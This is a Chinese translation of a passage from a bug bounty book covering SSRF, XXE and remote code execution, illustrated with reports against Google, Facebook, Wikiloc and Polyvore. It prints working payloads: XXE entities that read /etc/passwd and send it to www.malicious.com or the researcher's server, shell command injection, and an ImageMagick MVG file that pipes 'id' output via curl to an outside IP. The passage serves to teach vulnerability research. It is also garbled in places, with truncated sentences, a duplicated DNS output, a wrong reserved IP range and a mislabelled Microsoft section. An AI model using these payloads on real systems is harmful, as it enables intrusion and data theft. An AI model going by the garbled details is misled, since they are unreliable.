当你在寻找需要特定配置 URL 的漏洞时，Google dorking（Google 搜索指令）可以为你节省时间。如果你使用该工具寻找 SSRF 漏洞，请注意那些似乎与外部网站交互的目标 SSRF。在这种情况下，该网站是通过 URL 参数 `url=` 暴露的。当你发现 SSRF 时，要想得大一些。Buerhaus 原本可以使用 XSS 负载报告 SSRF，但其影响远不如访问该网站的 AWS 元数据。

## 谷歌内部 DNS SSRF

- 难度：中等

- URL: https://toolbox.googleapps.com/

- 来源：https://www.rcescurity.com/2017/03/ok-google-give-me-all-your-internal-dns-information/

- 报告日期：2017 年 1 月

- 赏金：未公开

有些网站本 intended 仅向外部网站执行 HTTP 请求。当你发现具有此类功能的网站时，检查你是否可以滥用它访问内部网络。

Google 提供了 https://toolbox.googleapps.com 网站，帮助用户调试他们在 Google G Suite 服务中遇到的问题。该服务的 DNS 工具引起了 Julien Ahrens（www.rcescurity.com）的注意，因为它允许用户执行 HTTP 请求。

谷歌的 DNS 工具包括 `dig`，它的作用就像 Unix 中的 `dig` 命令，允许用户查询域名服务器以获取网站的 DNS 信息。DNS 信息将 IP 地址映射到可读的域名，例如 `www.<example>.com`。在 Ahrens 发现问题时，Google 包含了两个输入字段：一个用于映射到 IP 地址的 URL，另一个用于域名服务器，如图 10-1 所示。

## G Suite 工具箱

首页 浏览器信息检查 MX Dig HAR 分析器 日志分析器 日志分析器 2 头部 开启

| 名称 | 名称服务器 |

| :--- | :--- |

| www.rcescurity.com | 8.8.8.8 |

| A | AAAA | ANY | CNAME | MX | NS | PTR | SOA | SRV | TXT |

```
id 38777
opcode QUERY
rcode NOERROR
flags (QR RD RA
;QUESTION
www.rcescurity.com. IN A
;ANSWER
www.rcescurity.com. 1702 IN A 144.76.196.198
;AUTHORITY
;ADDITIONAL
```

图 10-1：向 Google dig 工具发送的示例查询

Ahrens 特别注意了“Name server”（名称服务器）字段，因为它允许用户指定一个 IP 地址来作为 DNS 查询的目标。这一重大发现表明用户可以向任何 IP 地址发送 DNS 查询。

某些 IP 地址被保留供内部使用。它们可以通过内部 DNS 查询发现，但不应能通过互联网访问。这些保留的 IP 范围包括：

- 10.0.0.0 到 10.255.255.255
- 106.64.0.0 到 100.127.255.255
- 127.0.0.0 到 127.255.255.255
- 172.16.0.0 到 172.31.255.255
- 192.0.0.0 到 192.0.0.255
- 198.18.0.0 到 198.19.255.255

此外，某些 IP 地址被保留用于特定目的。

为了测试 Name server 字段，Ahrens 提交了自己的网站作为要查询的服务器，并使用 IP 地址 `127.0.0.1` 作为 Name server。IP 地址 127.0.0.1 通常被称为 localhost（本地主机），服务器用它指代自己。在这种情况下，localhost 是执行 `dig` 命令的 Google 服务器。Ahrens 的测试导致了错误“Server did not respond”（服务器未响应）。该错误意味着工具正尝试连接到自己的 53 端口（响应 DNS 查询的端口）来获取有关 Ahrens 网站 rcescurity.com 的信息。“未响应”这一措辞至关重要，因为它意味着服务器允许内部连接。



为了证明该漏洞的影响，Ahrens 必须获取 Google 内部网络的信息，因为内部网络的信息不应被公开访问。快速的 Google 搜索显示，Google 使用子域名 `corp.google.com` 作为其内部网站的基础。Ahrens 开始对 `corp.google.com` 进行子域名爆破，最终发现了域名 `ad.corp.google.com`。将此子域名提交给 `dig` 工具并请求 Ahrens 之前发现的内部 IP 地址的 A 记录，获得了 Google 的私有 DNS 信息，这些信息并非空空：

```
id 54403
opcode QUERY
rcode NOERROR
flags QR RD RA
;QUESTION
ad.corp.google.com IN A
;ANSWER
ad.corp.google.com. 58 IN A 100.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 100.REDACTED
;AUTHORITY
;ADDITIONAL
```

注意对内部 IP 地址 `100.REDACTED` 和 `172.REDACTED` 的引用。相比之下，`ad.corp.google.com` 的公共 DNS 查询返回以下记录，该记录不包含任何关于私有 IP 地址的信息。

```
dig ad.corp.google.com @8.8.8.8
id 54403
opcode QUERY
rcode NOERROR
flags QR RD RA
;QUESTION
ad.corp.google.com IN A
;ANSWER
ad.corp.google.com. 58 IN A 100.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 172.REDACTED
ad.corp.google.com. 58 IN A 100.REDACTED
;AUTHORITY
;ADDITIONAL
```

回到集成配置并提交了 `127.0.0.1:443`，这是由冒号分隔的访问 IP 地址和服务器端口。我想看看站点是否能通过 443 端口通信。再次，我收到了相同的 500 错误“无法连接”。端口 8080 同样收到了相同的错误。然后我尝试了端口 22，即通过 SSH 连接的端口。这次错误是 503，“无法检索所有标头”。

搞定。“无法检索所有标头”响应表示正向一个期望 SSH 协议的端口发送 HTTP 流量。这种响应与 500 响应不同，因为它确认了可以建立。我重新提交了报告，以证明可以使用 Web 集成对公司的内部服务器进行端口扫描，因为开放/关闭和被过滤端口的响应是不不同的。

## 启示

如果你可以提交 URL 来创建 Webhooks 或有意地导入远程内容，请尝试定义特定的端口。服务器对不同端口响应的细微变化可以揭示该端口是开放、关闭还是被过滤的。除了服务器返回的消息不同外，端口还可能通过服务器响应请求的时间长短揭示它们是开放、关闭还是被过滤的。

## 总结

SSRF 发生在攻击者可以利用服务器执行非预期网络请求时。但并非所有请求都是可以利用的。例如，站点允许你向远程或本地服务器发送请求并不意味着它具有重大影响。识别发送非预期请求的能力只是识别这些漏洞的第一步。报告它们的关键在于证明其行为的完整影响。在本章的每个示例中，站点都允许发送 HTTP 请求。但它们未能充分保护自己的基础设施免受恶意用户的攻击。

## 11 XML 外部实体

![](img/0e0c482eb94dba4b95528b396562dd10_223_0.png)

攻击者可以利用 XML 外部实体 (XXE) 漏洞利用应用程序解析可扩展标记语言 (XML)的方式。更具体地说，它涉及到利用应用程序处理输入中包含外部实体的方式。你可以使用 XXE 从服务器中提取信息，或调用恶意服务器。

## 可扩展标记语言

此漏洞利用了 XML 中使用的外部实体。XML 是一种元语言，意味着它被用来描述其他语言。它的开发是为了应对 HTML 的缺点，HTML 只能定义数据如何显示。相比之下，XML 定义了数据如何结构化。

例如，HTML 可以使用起始标签 `<h1>` 和结束标签 `</h1>` 将文本格式化为标题。（对于某些标签，结束标签是可选的。）每个标签都可以有一个预定义的样式，浏览器在渲染网站文本时会将该样式应用到文本上。例如，`<h1>` 标签可能会将所有标题格式化为粗体，字体大小为 14px。同样，`<table>` 标签以行和列的形式呈现数据，`<p>` 标签定义了普通段落的样式。

相比之下，XML 没有预定义的标签。相反，你自己定义标签，而这些定义并不一定包含在 XML 文件中。例如，考虑以下展示职位列表（job listing）的 XML 文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Job>
<Title>Hacker</Title>
<Compensation>1000000</Compensation>
<Responsibility fundamental="1">Shot web</Responsibility>
</Job>
```

所有标签都是作者定义的，因此仅从文件无法知道这些数据在网页上会什么样。

第一行是声明头，指示 XML 1.0 版本和要使用的 Unicode 编码。在初始头之后，`<Job>` 包裹了所有其他 `<Job>` 标签。每个 `<Job>` 包裹 `<Title>`、`<Compensation>` 和 `<Responsibility>` 标签。在 HTML 中，基础 XML 标签是由两个包含名称的角括号组成的。但与 HTML 标签不同，所有 XML 标签都需要结束标签。此外，每个 XML 标签都可以有一个属性。例如，`<Responsibility>` 标签名为 Responsibility，并有一个由属性名 fundamental 和属性值 1 组成的可选属性。

## 文档类型定义

由于作者可以定义任何标签，有效的 XML 文档必须遵循一组通用 XML 规则（这些超本书书的范围，但拥有结束标签就是其中一个）并匹配文档类型定义 (DTD)。XML DTD 是一组声明，定义了哪些元素存在、它们可以具有什么属性以及哪些元素可以包含在其他元素内部。（元素由起始和结束标签组成，因此起始 `<foo>` 是标签，结束 `</foo>` 也是标签，但 `<foo></foo>` 是一个元素。）XML 文件可以使用外部 DTD，也可以使用在 XML 文档内部定义的内部 DTD。

## 外部 DTD

DTD 是 XML 文档引用并获取的外部 `.dtd` 文件。以下是前面所示 Jobs 文档的外部 DTD 文件可能的样式。

```xml
<!ELEMENT Jobs (Job)*>
<!ELEMENT Job (Title, Compensation, Responsibility)>
<!ELEMENT Title (#PCDATA)>
<!ELEMENT Compensation (#PCDATA)>
<!ELEMENT Responsibility (#PCDATA)>
<!ATTLIST Responsibility fundamental CDATA "0">
```

XML 文档中使用的每个元素都在 Jobs 中定义。星号 `*` 表示 Jobs 可以包含零或多个 Job。Job 元素必须包含 Title、Compensation 和 Responsibility。`(#PCDATA)` 告诉解析器元素仅包含字符数据。最后，Responsibility 声明为 CDATA。Responsibility 的默认值为 0。外部 DTD 使用 `<!DOCTYPE>` 定义。

```xml
<!DOCTYPE note SYSTEM "jobs.dtd">
```

在这种情况下，我们使用 SYSTEM 定义。`SYSTEM` 是告诉解析器获取 jobs 文件的关键字。

## 内部 DTD

也可以将 DTD 包含在 XML 文档中。要这样做，XML 的第一个元素必须是 `<!DOCTYPE>` 元素。通过使用内部 DTD 结合 XML 文件和 DTD，我们将得到如下所示文档：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Jobs [
<!ELEMENT Jobs (Job)*>
<!ELEMENT Job (Title, Compensation, Responsibility)>
<!ELEMENT Title (#PCDATA)>
<!ELEMENT Compensation (#PCDATA)>
<!ELEMENT Responsibility (#PCDATA)>
<!ATTLIST Responsibility fundamental CDATA "0">
]>
<Jobs>
  <Job>
    <Title>Hacker</Title>
    <Compensation>1000000</Compensation>
    <Responsibility fundamental="1">Shot web</Responsibility>
  </Job>
</Jobs>
```

在这里，我们拥有所谓的内部 DTD 声明。注意我们仍然从声明头开始，指示文档符合 XML 1.0 并使用 UTF-8 编码。紧接着，我们定义了 XML 遵循的 `<!DOCTYPE>`，这次是直接写出整个 DTD 而不是引用外部文件。XML 文档的其余部分遵循 DTD 声明。

## XML 实体

XML 文档包含 XML 实体，它们就像信息的占位符。再次使用我们的 `<Jobs>` 示例，如果我们希望每个职位都包含指向我们网站的链接，那么每次都编写地址将非常麻烦，特别是如果我们的 URL 可能会发生。相反，我们可以使用实体，让解析器在解析时获取 URL，并将值插入文档。要创建一个实体，你需要在 `<!ENTITY>` 标签中声明占位符实体名称，并配合 DOCTYPE 放入该占位符。在 XML 文档，实体名称以安培符号（`&`）开头并以分号（`;`）结束。当访问 XML 文档时，占位符名称将被替换为标签中声明的值。实体名称的作用不仅仅是将占位符替换为字符串：它们还可以使用 `SYSTEM` 标签配合 URL 获取网站或文件的内容。

我们可以更新 XML 文件来包含此内容：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Jobs [
--snip-
<!ATTLIST Responsibility fundamental CDATA "0">
<!ELEMENT Website ANY>
<!ENTITY url SYSTEM "website.txt">
<Jobs>
<Job>
<Title>Hacker</Title>
<Compensation>1000000</Compensation>
<Responsibility fundamental="1">Shot web</Responsibility>
<Website>&url;</Website>
</Job>
</Jobs>
```

注意，我添加了一个 `Website !ELEMENT`，但没有使用 `(#CDATA)`，而是使用了 `ANY`。这个数据定义意味着 `Website` 标签可以包含任何组合解析数据。我还定义了一个带有 `SYSTEM` 属性的 `<!ENTITY>`，告诉解析器在 `website` 标签内任何占位符名称 `url` 所在获取 `website.txt` 文件的内容。当我使用 `website` 标签时，`website.txt` 的内容将替换 `&url;`。注意实体名称前面的 `&`。

当你在 XML 文档中引用实体时，必须在它前面加上 `&`。

## XXE 攻击是如何工作的

在 XXE 攻击中，攻击者滥用目标应用程序，使其在 XML 解析中包含外部实体。换句话说，应用程序期望某些 XML 但没有对接收到的内容进行验证；它只是解析所收到的任何内容。例如，假设上一个例子中的招聘板允许你通过 XML 注册并上传职位。

招聘板可能会向你提供其 DTD 文件，并假设你将提交一个符合要求的文件。与其让 `<!ENTITY>` 获取 "website.txt" 的内容，不如让它获取 "/etc/passwd" 的内容。XML 将被解析，服务器文件 `/etc/passwd` 的内容将包含在我们的内容中。（`/etc/passwd` 文件最初存储了 Linux 系统上所有的用户名和密码。虽然 Linux 系统现在将密码存储在 `/etc/shadow` 中，但读取 `/etc/passwd` 文件来证明漏洞的存在是常见做法。）

你可能会提交类似的内容：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

解析器接收此代码并识别出一个定义 `foo` 文档类型的内部 DTD。DTD 告诉解析器 `foo` 可以包含任何可解析数据；然后有一个实体 `xxe`，在解析文档时它应该读取我的 `/etc/passwd` 文件（`file://` 表示指向 `/etc/passwd` 文件的完整 URI 路径）。解析器应该将 `&xxe;` 元素替换为这些文件内容。然后，你通过 XML 定义一个 `<foo>` 标签完成最后步骤，打印我的服务器信息。朋友们，这就是为什么 XXE 如此危险的原因。

等一下，还有更多。如果应用程序不打印响应而仅解析我的内容呢？如果敏感文件的内容从未返回给我，这个漏洞还有用处吗？嗯，与其解析本地文件，不如联系一个恶意服务器，例如：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>&callhome;</foo>
```

现在当 XML 文档被解析时，`callhome` 实体被替换为对 `www.malicious.com/?xxe` 的调用内容，要求 `%xxe` 按照定义进行求值。XML 解析器读取 `/etc/passwd` 并将其作为 URL `www.malicious.com/` 的参数，从而将文件内容作为 URL 参数发送。因为你控制着那个服务器，你会检查日志，果真，那里会有 `/etc/passwd` 的内容。

你可能已经在 `callhome` URL 中使用了 `%` 而不是 `&`，即 `%xxe;`。当实体需要在 DTD 定义内进行求值时，使用 `%`。当实体在 XML 文档中求值时，使用 `&`。

网站通过禁用外部实体的解析来防止 XXE 漏洞。OWASP XML 外部实体防护速查（参见 https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet）提供了如何针对各种语言执行此操作的说明。

## 获取 Google 的读取权限

- **难度：** 中
- **URL：** `https://google.com/gadgets/directory?synd=toolbar/`
- **来源：** `https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/`
- **报告日期：** 2014年4月
- **奖金金额：** $10,000

此 Google 读取权限漏洞利用了 Google 工具栏按钮库的一个功能，该功能允许开发者通过上传包含元数据的 XML 文件来定义自己的按钮。开发者可以搜索按钮库，Google 会显示描述。根据 Detectify 团队的说法，当上传 XML 文件时，它会渲染了。

## 启示

即使是大型公司也会犯错。当你在 XML 文档中引用实体时，必须在它前面加上 `&`。

## 微软的 XXE

- **难度：** 高
- **URL：** `https://google.com/`
- **来源：** 博客
- **报告日期：** 2014年4月
- **奖金金额：** $6,000

这个 XXE 比上一个例子更具挑战性，因为它涉及。

`/etc/passwd` 文件的内容被追加了。这意味着 Ramadan 要么无法利用该漏洞读取本地文件，要么 `/etc/passwd` 文件不存在。



在我继续这份报告之前，我应该补充一点，Ramadan 本可以提交一个不需要向其服务器发送远程调用的文件，而是直接尝试读取本地文件。但对远程 DTD 文件的初始调用如果成功，就能证明存在 XXE 漏洞，而读取本地文件的尝试失败则不会。在这种情况下，由于 Ramadan 记录了来自 Facebook 向其服务器的 HTTP 调用，他可以证明 Facebook 正在解析远程 XML 实体，尽管他无法访问 `/etc/passwd`，但漏洞确实存在。

当 Ramadan 报告该漏洞时，Facebook 回复要求提供概念验证（POC）视频，因为他们无法复制上传过程。在 Ramadan 提供视频后，Facebook 拒绝了该提交，并建议是招聘人员点击了链接，从而触发了向其服务器的请求。在交换几次邮件后，Facebook 团队进行了一些调查，确认了漏洞确实存在并发放了赏金。由于 Ramadan 的 XXE 无法升级为远程代码执行，因此 Facebook 发放了较少的赏金。

## 启示

这里有几点启示。XML 文件有不同的形状和大小：关注那些接受 `.docx`、`.xlsx`、`.pptx` 以及其他 XML 文件类型的网站，因为可能有自定义应用程序在解析这些文件的 XML。起初，Facebook 认为有一位员工点击了连接到 Ramadan 服务器的恶意链接，这不会被视为 SSRF。但经过进一步调查，Facebook 确认该请求是通过另一种方法调用的。

正如你在其他示例中看到的，有时报告最初会被拒绝。如果你确定漏洞是有效的，保持信心并继续与你报告的机构保持沟通至关重要。不要回避解释为什么某些内容可能是一个漏洞，或者其严重性比公司最初的评估要高。

# WIKILOC XXE

- 难度：困难
- URL：`https://wikiloc.com/`
- 来源：`https://www.davidsopas.com/wikiloc-xxe-vulnerability/`
- 报告日期：2015年10月
- 发放赏金：周边物品（Swag）

Wikiloc 是一个用于发现和分享徒步、骑行和其他许多活动最佳户外路线的网站。它允许用户通过 XML 文件上传自己的轨迹，事实证明这对像 David Sopas 这样的骑行黑客来说非常有吸引力。

Sopas 注册了 Wikiloc，在注意到 XML 上传功能后，决定测试是否存在 XXE 漏洞。首先，他从一个网站下载了一个文件来确定 Wikiloc 的 XML 结构，在这种情况下这是一个 `.gpx` 文件。然后他修改了该文件并将其上传。这是他修改后的文件：

```
{linenos=on}
<!DOCTYPE foo [<!ENTITY xxe SYSTEM
"http://www.davidsopas.com/XXE"]>
<gpx
version="1.0"
creator="GPSBabel - http://www.gpsabel.org"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns="http://www.topofix.com/GPX/1/0"
si:schemaLocation="http://www.topofix.com/GPX/1/1"
http://www.topofix.com/GPX/1/1/gpx.xsd">
<time>2015-10-29T12:53:09Z</time>
<bounds minlat="40.734267000" minlon="-8.265529000"
maxlat="40.881475000"
maxlon="-8.037170000"/>
<trk>
<name>&xxe;</name>
<trkseg>
<trkpt lat="40.737758000" lon="-8.093361000">
<ele>178.000000</ele>
<time>2009-09-01T14:18:10Z</time>
--snip---->
```

在 ① 处，他作为文件的第一行添加了一个外部实体定义。在 ② 处，他在 `.gpx` 文件的轨迹名称内部调用了该实体。

将文件传回 Wikiloc 导致了向 Sopas 服务器的 HTTP GET 请求。这值得注意，有两个原因：首先，通过简单的概念验证调用，Sopas 能够确认服务器正在评估他注入的 XML，并且服务器会发出外部调用。其次，Sopas 使用了现有的 XML 文档，因此他的内容符合网站预期的结构。

在 Sopas 确认 Wikiloc 会发出外部 HTTP 请求后，唯一的问题是它是否会读取本地文件。因此，他修改了注入的 XML，让 Wikiloc 向他发送 `/etc/issue` 文件的内容（`/etc/issue` 文件将返回所使用的操作系统信息）：

```
<!DOCTYPE roottag [
  <!ENTITY % file SYSTEM "file:///etc/issue">
  <!ENTITY % dtd SYSTEM "http://www.davidsopas/poc/xxe.dtd">
  %dtd;
<gpx
  version="1.0"
  creator="GPSBabel -"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns="http://www.topografix.com/GPX/1/0"
  xsi:schemaLocation="http://www.topografix.com/GPX/1/1
  http://www.topofix.com/GPX/1/1/gpx.xsd">
  <time>2015-10-29T12:53:09Z</time>
  <bounds minlat="-40.734267000" minlon="-78.265529000"
  maxlat="40.881475000"
  maxlon="-8.037170000"/>
  <trk>
  <name>&send;</name>
--snip--
```

这段代码看起来很熟悉。这里他在 ① 和 ② 处使用了两个实体，这些实体使用 `%` 定义，因为它们将在 DTD 中被评估。③ 处，他获取了 `xxe.dtd` 文件。标签中的引用 `&send;` ④ 是由他通过远程调用其服务器 ② 返回给 Wikiloc 的 `xxe.dtd` 文件定义的，该 `xxe.dtd` 文件是：

`%all` 定义了 Sopas 执行时的实体 `send`，与 Ramadan 对 Facebook 的方法类似，但有一个细微的：Sopas 尝试确保包含所有可以执行 XXE 的地方。这就是为什么在内部 DTD 中定义 `%dtd` 之后立即调用它，在外部 DTD 中定义 `%all;` 之后也立即调用它。执行的代码在网站的后端，因此你可能不会确切知道漏洞是如何执行的。但解析过程可能是这样的：

1. Wikiloc 解析 XML 并将 `%dtd;` 评估为对 Sopas 服务器的外部调用。然后 Wikiloc 请求 Sopas 服务器上的 `xxe.dtd` 文件。
2. Sopas 服务器将 `xxe.dtd` 文件返回 Wikiloc。
3. Wikiloc 解析接收到的 DTD 文件，触发了 `%all` 的调用。
4. 当 `%all` 被评估时，它定义了 `send`，包含了对 `%file`。
5. URL 值中的 `%file` 调用替换为 `/etc/issue` 的内容。
6. Wikiloc 解析 XML 文档。这解析了 `&send;` 实体，变为指向 Sopas 服务器的远程调用，参数为 `/etc/issue` 的内容。

用他自己的话说，完蛋（game over）。

## 启示

这里有几点启示。XML 文件有不同的形状和大小：可以使用网站的 XML 模板嵌入自己的 XML 实体。在这种情况下，Wikiloc 预期 `.gpx` 文件，Sopas 保持了该结构。

## 总结

XXE 代表了一个具有巨大潜力的攻击向量。可以通过几种方式实现 XXE 攻击：让漏洞应用程序打印 `/etc/passwd` 文件、使用 `/etc/passwd` 文件的内容调用远程服务器，以及调用远程 DTD 文件以指示解析器回调到服务器。

关注文件上传，特别是那些接受某种形式 XML 的上传。你应该始终测试它们是否存在 XXE 漏洞。

# 12 远程代码执行

![img/0e0c482eb94dba4b95528b396562dd10_241_0.png](img/0e0c482eb94dba4b95528b396562dd10_241_0.png)

代码执行（RCE）漏洞发生在应用程序在未经过过滤的情况下使用用户控制输入。RCE 通常通过两种方式被利用。第一是执行 shell 命令。第二是执行漏洞应用程序使用或依赖的编程语言中的函数。

## 执行 shell 命令

你可以通过执行应用程序未清理的 shell 命令来执行 RCE。shell 提供了对操作系统服务的命令行访问。作为一个例子，让我们假设网站 `www.example.com` 设计用于 ping 远程服务器以确认服务器是否可用。用户可以通过在 `www.example.com?domain=` 中的 `domain` 参数中提供域名来触发此操作，网站的 PHP 代码处理如下：

```php
$domain = $_GET['domain'];
echo shell_exec("ping -c 1 $domain");
```

### 访问

在 ① 处将值 `google.com` 赋值给变量 `$domain`，然后在 ② 处将该变量作为 `ping` 命令的参数直接传递给 `shell_exec` 函数。`shell_exec` 函数执行 shell 命令并将完整输出作为字符串返回。

该命令的输出类似于下面：

```
PING google.com (216.58.195.238) 56(84) bytes of data.
64 bytes from sfo3s06-in-f14.1e100.net (216.58.195.238): icmp_seq=1 ttl=56
time=1.51 ms

--- google.com ping statistics ---
  1 packets transmitted, 1 received, 0% packet loss, time 0ms
  min/avg/max/mdev = 1.519/1.519/1.519/0.000 ms
```

响应的细节是：只需要知道 `$domain` 变量被直接传递给了 `shell_exec` 命令，而没有经过任何过滤。在流行的 shell `bash` 中，你可以使用分号 `;` 来组合命令。因此，攻击者可以访问 URL `www.example.com?domain=id;`，此时 `shell_exec` 函数就会执行 `ping` 和 `id` 命令。`id` 命令会输出在服务器上执行命令的当前用户信息。例如，输出可能如下所示：

```
PING google.com (172.217.5.110) 56(84) bytes of data.
64 bytes from sfo3s07-in-f14.1e100.net (172.217.5.110):
icmp_seq=1 ttl=56 time=1.94 ms
--- google.com ping statistics
1 packets transmitted, 1 received, 0% packet loss, time 0ms
min/avg/max/mdev = 1.940/1.940/1.940/0.000 ms
? uid=1000(yaworsk) gid=1000(yaworsk) groups=1000(yaworsk)
```

服务器执行了两个命令，因此 `ping` 命令的响应显示了 1 以及来自 `id` 命令的输出。`id` 命令的输出 2 表示该网站在服务器上以名为 `yaworsk` 的用户运行应用程序，其 uid 为 1000，属于同名为 `yaworsk` 的 gid 组和用户组。

`yaworsk` 的用户权限决定了此 RCE 漏洞的严重程度。在本例中，攻击者可以使用命令 `:cat FILENAME`（其中 FILENAME 是要读取的文件）读取网站代码，并可能向某些目录写入文件。如果网站使用数据库，攻击者很可能也可以导出数据库。

如果网站对用户控制的输入没有进行过滤就直接使用，就会发生这种类型的 RCE。解决该漏洞的方法非常简单。在 PHP 中，网站开发者可以使用 `escapeshellcmd`，它会转义字符串中可能触发 shell 执行任意命令的字符。因此，URL 参数中任何附加的命令都将被视为一个转义后的值。这意味着 `google.com;id` 将被传递给 `ping` 命令，导致错误 `ping: google.com;id: Name or service not known.`。

尽管特殊字符会被转义以避免执行额外的任意命令，但请记住，`escapeshellcmd` 并不能阻止你传递命令行标志（flags）。标志是改变命令行为的可选参数。例如，`-o` 是一个常用的标志，用于在命令生成输出时定义一个写入文件。传递标志可能会改变命令的行为，并可能导致 RCE 漏洞。由于这些细微差别，防止 RCE 漏洞可能会变得非常复杂。

## 执行函数

你也可以通过执行函数来执行 RCE。例如，如果 `www.example.com` 允许用户通过 URL 创建和编辑博客文章，如 `www.example.com?id=1&action=view`，那么执行这些操作的代码可能如下所示：

```php
$action = $_GET['action'];
$id = $_GET['id'];
```

这里，网站使用了 PHP 函数 `call_user_func`，该函数将第一个参数作为函数调用，并将剩余参数作为参数传递给该函数。在这种情况下，应用程序将调用分配给 `$action` 变量的 `view` 函数，并将 1 传递给该函数。此命令预计会显示第一篇博客文章。

但如果恶意用户访问 URL `www.example.com?id=/etc/passwd&action=file_get_contents`，这段代码将评估为：

```php
$action = $_GET['action']; //file_get_contents
$id = $_GET['id']; //etc/passwd
call_user_func($action, $id); //file_get_contents(/etc/passwd);
```

将 `file_get_contents` 作为 `action` 参数传递，调用 PHP 函数将文件内容读取到字符串。在这种情况下，文件 `/etc/passwd` 被作为 `id` 参数传递。然后 `/etc/passwd` 被作为参数传递给 `file_get_contents`，导致文件被读取。攻击者可以利用此漏洞读取源代码。

## 提升远程执行的策略

两种类型的 RCE 都会导致各种影响。当攻击者可以执行命令时，漏洞的范围取决于攻击者的权限。在攻击者可以提升权限的情况下，这通常被称为本地权限提升（LPE）。虽然 LPE 的详细解释超出了本书的范围，但你只需要知道 LPE 通常是通过利用内核漏洞或设置用户 ID（SUID）的可执行文件发生的。尽管这本意是为了增强安全性，但如果配置不当，可能会允许攻击者以高权限执行命令。

输出 `files` 目录的内容。在测试此类漏洞时请务必极其小心。并不是所有的赏金计划都希望你在他们的服务器上执行你自己的代码。如果你上传了像这样的后门（shell），请务必将其删除，以防他人发现或进行恶意利用。

更复杂的 RCE（远程代码执行）示例通常由于应用行为的细微差异或编程错误导致。事实上，此类示例在第 8 章中讨论过。Orange Tsai 的 Uber Flask Jinja2 模板注入（第 74 页）是一个 RCE 漏洞，允许他使用 Flask 模板语言执行他自己的 Python 函数。我所研究的 Ukirn Smarty 模板注入（第 78 页）使我能够利用 Smarty 框架执行 PHP 函数，包括 `file_get_contents`。鉴于 RCE 的多样性，这里将重点介绍比你之前在前面的章节中看到的更具传统的示例。

# POLYVORE IMAGEMICK

- 难度：中等
- URL：`Polyvore.com`（雅虎收购）
- 来源：`http://nahamsec.com/exploiting-imagemagick-on-yahoo/`
- 报告日期：2016年5月5日
- 赏金金额：$2,000

查看在广泛使用的软件库中披露的漏洞，可以是发现使用该软件的网站中 Bug 的有效方法。ImageMagick 是一种常用的图形库，用于处理图像，并且在大多数（如果不是所有）主流编程语言中实现。这意味着 ImageMagick 库中的 RCE 漏洞会对依赖于它的网站产生毁灭性影响。

2016年4月，ImageMagick 的维护者公开发布了库更新以修复关键漏洞。这些更新揭示了 ImageMagick 在多种方式上没有对输入进行妥当的过滤。其中最危险的是导致了通过 ImageMagick 的代理（delegate）功能触发 RCE，该功能使用外部库处理文件。以下代码通过使用一个用户控制的域名作为 `system()` 命令的占位符 `%M` 实现了这一点：

```
"wget -q -O "%o" "https://%M"
```

该值在在使用之前没有经过过滤，因此，提交 `https://example.com";;ls "-la"` 将转换为以下内容：

```
wget -q -O "%o" "https://example.com";;ls "-la"
```

作为一个早期的 RCE 示例（它涉及将额外的命令链接到 `ping` 之后），这段代码使用分号将一个额外的命令行函数链到预定的功能中。



代理功能可以被允许外部文件引用的图像文件类型滥用。示例包括 SVG 和 ImageMagick 定义的文件类型 MVG。当 ImageMagick 处理图像时，它会尝试根据文件内容而非扩展名来推断文件的类型。例如，如果开发者尝试通过仅允许应用程序接受以 `.jpg` 结尾的用户文件来对提交的图像进行过滤，那么攻击者可以通过将 `.mvg` 文件重命名为 `.jpg` 来绕过过滤。应用程序会认为该文件是安全的 `.jpg`，但 ImageMagick 会根据文件内容正确识别出该文件类型为 MVG。这将允许攻击者滥用 ImageMagick 的 RCE 漏洞。

用于利用此 ImageMagick 漏洞的恶意文件示例可以访问：https://imagetagick.com/

在该漏洞公开披露且网站有机会更新其代码后，Ben Sadeghipour 开始寻找使用未打补丁的 ImageMagick 的网站。作为第一步，Sadeghipour 在自己的服务器上重建了该漏洞，以确认他拥有一个有效的恶意文件。他选择使用来自 https://imagetagick.com/ 的示例 MVG 文件，也可以轻松地使用 SVG，因为两者都引用了外部文件，从而触发漏洞的 ImageMagick 代理功能。这是他的代码：

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl http://SOMEIPADDRESS:8080/ -d @- > /dev/null`'
pop graphic-context
```

该文件的重要部分是如 ①所示的行，它包含了恶意输入。让我们拆解它。利用的第一部分是 `https://127.0.0.1/x.php?x=`。这是 ImageMagick 期望作为其代理行为一部分的远程 URL。Sadeghipour 在其后跟随的是 `id`。在命令行上，反引号（``）表示 shell 在执行主命令之前应该处理的输入。这确保了 Sadeghipour 的有效负载（下文描述）被立即处理。

